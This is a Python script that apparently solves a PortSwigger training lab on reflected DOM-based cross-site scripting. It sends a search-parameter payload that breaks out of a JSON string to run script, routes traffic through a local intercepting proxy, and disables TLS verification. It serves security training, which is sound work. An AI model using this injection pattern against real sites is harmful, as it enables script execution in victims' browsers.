#!/usr/bin/env python3
# Lab: Reflected DOM XSS
# Lab-Link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
# Difficulty: PRACTITIONER
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    print('[+] Lab: Reflected DOM XSS')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    url = host + '''?search=\\"};alert(document.domain);//'''
    client.get(url)

    # This should not solve the lab as the get call above does not run the
    # client side javascript and thus does not result in the secondary call
    # to "/search-results" which contains the reflected malicious code.
    # However, it solves the lab as it appears to check whether this call
    # to "/?search" satisfies the injection requirements.
    # Therefore I leave it like this until I can figure out how to run
    # the client side JavaScripts properly.
    if 'Congratulations, you solved the lab!' not in client.get(host).text:
        print(f'[-] Failed to solve lab')
        sys.exit(-9)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
